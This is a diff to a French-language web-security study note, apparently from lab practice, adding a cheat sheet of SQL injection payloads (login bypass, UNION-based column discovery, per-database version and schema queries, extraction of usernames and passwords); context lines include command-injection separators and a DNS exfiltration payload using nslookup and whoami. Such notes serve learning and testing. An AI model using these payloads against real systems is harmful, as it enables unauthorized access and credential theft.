@@ -113,3 +113,25 @@ statut: en cours
 - ``& nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN &`` - exfiltration out-of-band par DNS
 - Séparateurs à essayer : `&`, `&&`, `|`, `||`, `;` et saut de ligne `%0a` (les deux derniers : Unix seulement) ; `` `cmd` `` et `$(cmd)` sur Unix
 - Détail : [[Command-injection]]
+
+### SQL injection ([[SQL-injection]])
+- `'` - détection : une erreur de base de données ou une réponse anormale indique un point d'injection
+- `Gifts'--` - commentaire : supprime la fin de la requête (`AND released = 1`)
+- `'+OR+1=1--` - condition toujours vraie : affiche tous les produits, y compris non publiés (prudence si la condition atteint un `UPDATE` ou un `DELETE`)
+- `administrator'--` dans `username`, mot de passe vide - contournement de connexion
+- Commentaires : `--` (MySQL : suivi d'un espace, soit `--+` en URL), `#` (MySQL, à encoder en `%23` dans une URL)
+- Colonnes, méthode `ORDER BY` : `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--` ... jusqu'à l'erreur ; la dernière valeur sans erreur donne le nombre de colonnes
+- Colonnes, méthode `NULL` : `'+UNION+SELECT+NULL--`, `'+UNION+SELECT+NULL,NULL--`, `'+UNION+SELECT+NULL,NULL,NULL--` ... jusqu'à la disparition de l'erreur
+- Oracle : `' UNION SELECT NULL FROM DUAL--` - `FROM` obligatoire, table intégrée `DUAL`
+- Colonne de type chaîne : `' UNION SELECT 'a',NULL,NULL,NULL--`, puis `NULL,'a',NULL,NULL`, etc. ; en lab, remplacer `'a'` par la valeur aléatoire fournie
+- `'+UNION+SELECT+username,+password+FROM+users--` - extraction de la table `users` (deux colonnes de type chaîne)
+- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` - plusieurs valeurs dans une seule colonne (Oracle, PostgreSQL)
+- Concaténation selon la base : Oracle et PostgreSQL `'foo'||'bar'`, Microsoft `'foo'+'bar'` (envoyer `%2b` en URL), MySQL `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')`
+- Version : `' UNION SELECT @@version,NULL--` (Microsoft), `' UNION SELECT @@version,NULL#` (MySQL), `' UNION SELECT banner,NULL FROM v$version--` (Oracle), `' UNION SELECT version(),NULL--` (PostgreSQL)
+- Tables, hors Oracle : `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
+- Colonnes, hors Oracle : `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
+- Tables, Oracle : `' UNION SELECT table_name,NULL FROM all_tables--`
+- Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` (noms en majuscules)
+- Catégorie inexistante dans le filtre - isole la ligne injectée du reste des résultats
+- Le point d'injection peut aussi être dans le corps de la requête, un cookie ou un en-tête
+- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]]
